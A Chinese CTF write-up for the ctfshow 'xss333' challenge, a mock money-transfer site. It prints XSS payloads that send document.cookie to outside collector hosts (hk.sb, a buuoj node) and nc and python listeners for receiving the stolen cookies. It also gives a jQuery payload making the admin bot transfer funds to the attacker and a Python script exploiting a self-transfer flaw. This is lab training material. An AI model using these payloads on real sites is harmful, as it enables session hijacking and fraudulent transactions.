

# ctfshow-xss333



##### 参考链接

其他大佬链接

feng  https://ego00.blog.csdn.net/article/details/114079028

Y4	 https://blog.csdn.net/solitudi/article/details/111568030?spm=1001.2014.3001.5501

bit   https://www.xl-bit.cn/index.php/archives/120/



```
欢迎你使用ctfshow转账,你的余额：5元

收款人
请输入收款人
金额
请输入金额
 

```



```javascript
javascript发送Http请求，XMLHttpRequest

var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
httpRequest.open('POST', 'url', true); //第二步：打开连接
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
httpRequest.send('name=teswe&ee=ef');//发送请求 将情头体写在send中
/**
 * 获取数据后的处理程序
 */
httpRequest.onreadystatechange = function () {//请求后的回调接口，可将请求成功后要执行的程序写在其中
    if (httpRequest.readyState == 4 && httpRequest.status == 200) {//验证请求是否发送成功
        var json = httpRequest.responseText;//获取到服务端返回的数据
        console.log(json);
    }
};



2 jquery  ajax 发送post 
<script>$.ajax({url:'api/change.php',type:'post',data:{p:'1234567'}});</script>
```



```html
既然前面是反射型xss  其实不管它是反射还是存储 
主要还是需要我们利用xss平台 获取cookie


xss平台
https://ww.rs/
https://hk.sb/


输入框输入
<Img sRC=//hk.sb/UfVb/test.jpg>

后面用了buu的公开靶机当个nc监听的服务器  花生壳内网穿透也可以 nc
nc -lvp 1104
正常的vps那边是需要nc的，但是nc好像不能持续接收，但是方法其实很多，可以重复起nc，或者我这边就临时拿python起一个临时的服务器，接收一下get参数：
python -m http.server 1104
<svg/onload="window.open('https://hk.sb/y7xx'+document.cookie)">
<body/onload="window.open('https://hk.sb/y7xx'+document.cookie)">

<svg/onload="window.open('http://node4.buuoj.cn:1104/'+document.cookie)">
    <svg	onload="window.open('http://3e8366a0-4e63-4eec-963d-6fa92cad126e.node4.buuoj.cn:1104/'+document.cookie)">
     
 
 首先先注册一个用户 ruiwen 123123
 然后点击转账汇款  发现自己只有5元
 购买flag 需要 9999元
 然后转账可以给自己转账  可以每次转自己金额-1的金额 保证自己不为0
 然后就相当于迭代 bp 或者python 跑都可以
        
 Y4 的方法是让管理员机器人给我们转账
    $.ajax({
                url: "http://127.0.0.1/api/amount.php",
                method: "POST",
                data:{
                    'u':'y4tacker',
                    'a':10000
                },
                cache: false,
                success: function(res){
                    
            }});

我们先创建一个号<script src=我自己的js利用脚本内容是下面这个></script>（记得映射公网），之后登陆退出后，再创建一个名为y4tacker坐等收钱    
        
        
    
    ctfshow{493faa40-38a1-4e05-9182-e7c325bb9de5}  
        

        
```

```python
import requests
import re
import time

x=5
url="http://623b0ed7-6f02-4ba6-839e-b55d6bd4948a.challenge.ctf.show/api/amount.php"
url2="http://623b0ed7-6f02-4ba6-839e-b55d6bd4948a.challenge.ctf.show/api/getFlag.php"
headers={'Cookie':'PHPSESSID=otcp1um67ulciv7eo3o2v7f0jr'}  #自己登录后的sessionid
while True:
    print(x)
    t=x-1
    data={
    'u':'ruiwen', #注册的用户名
    'a':str(t)
    }
    r=requests.post(url,headers=headers,data=data)
    print(r.text)
    if(x>10000):
        r2=requests.get(url2,headers=headers)
        print(r2.text)
        break
    x+=t
```

